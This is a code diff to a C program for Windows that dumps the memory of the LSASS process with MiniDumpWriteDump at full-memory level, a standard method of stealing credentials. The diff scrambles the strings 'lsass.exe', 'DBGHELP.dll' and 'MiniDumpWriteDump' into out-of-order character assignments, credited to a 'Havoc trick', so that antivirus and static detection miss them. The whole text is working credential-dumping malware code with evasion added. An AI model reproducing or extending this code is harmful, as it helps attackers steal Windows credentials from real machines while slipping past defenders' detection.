@@ -96,7 +96,19 @@ void wmain()
 	HANDLE hLsassFile = NULL;
 	HANDLE hFile = NULL;
 
-	WCHAR l$a$s[] = { 'l', 's', 'a', 's', 's', '.', 'e', 'x', 'e', 0 };
+    // Havoc trick https://github.com/HavocFramework/Havoc/blob/dev/payloads/Demon/Source/Core/MiniStd.c#L243
+	WCHAR l$a$s[10] = { 0 };
+
+	l$a$s[5] = HWChar(L'.');
+	l$a$s[8] = HWChar(L'e');
+	l$a$s[2] = HWChar(L'a');
+	l$a$s[1] = HWChar(L's');
+	l$a$s[9] = HWChar(L'\0');
+	l$a$s[7] = HWChar(L'x');
+	l$a$s[4] = HWChar(L's');
+	l$a$s[0] = HWChar(L'l');
+	l$a$s[3] = HWChar(L's');
+	l$a$s[6] = HWChar(L'e');
 	
 	DWORD dwLsassPID = GetPID(l$a$s);
 
@@ -125,10 +137,46 @@ void wmain()
 		
 	}
 
-	WCHAR libraryName[] = {'D', 'B', 'G', 'H', 'E', 'L', 'P', '.', 'd', 'l', 'l', 0};
+	WCHAR libraryName[12] = {0};
+
+	libraryName[4] = HWChar(L'E');
+	libraryName[9] = HWChar(L'l');
+	libraryName[5] = HWChar(L'L');
+	libraryName[10] = HWChar(L'l');
+	libraryName[0] = HWChar(L'D');
+	libraryName[3] = HWChar(L'H');
+	libraryName[11] = HWChar(L'\0');
+	libraryName[8] = HWChar(L'd');
+	libraryName[1] = HWChar(L'B');
+	libraryName[7] = HWChar(L'.');
+	libraryName[2] = HWChar(L'G');
+	libraryName[6] = HWChar(L'P');
+
 	HMODULE moduleHandle = queueLoadLibrary(libraryName);
-	CHAR minidump[] = {'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p', 0};
-	_MiniDumpWriteDump MiniWriteDump = (_MiniDumpWriteDump)GetProcAddress(moduleHandle, minidump);
+
+	//CHAR minidump[] = {'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p', 0};
+	
+	CHAR md[18] = {0};
+	md[2] = HChar('n');
+	md[4] = HChar('D');
+	md[0] = HChar('M');
+	md[3] = HChar('i');
+	md[5] = HChar('u');
+	md[1] = HChar('i');
+	md[8] = HChar('W');
+	md[13] = HChar('D');
+	md[7] = HChar('p');
+	md[16] = HChar('p');
+	md[11] = HChar('t');
+	md[6] = HChar('m');
+	md[17] = HChar('\0');
+	md[10] = HChar('i');
+	md[14] = HChar('u');
+	md[9] = HChar('r');
+	md[15] = HChar('m');
+	md[12] = HChar('e');
+	
+	_MiniDumpWriteDump MiniWriteDump = (_MiniDumpWriteDump)GetProcAddress(moduleHandle, md);
 	BOOL bSuccess = MiniWriteDump(hLsass, dwLsassPID, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
 	if (!bSuccess)
 	{
@@ -136,7 +184,7 @@ void wmain()
 		goto _CleanUP;
 	}
 	
-	wprintf(L"[+] L$a$$ mem dumped successful Save in %ls.\n", szFileName);
+	wprintf(L"[+] L$a$$ mem dumped successful save in %ls.\n", szFileName);
 
 
 _CleanUP:
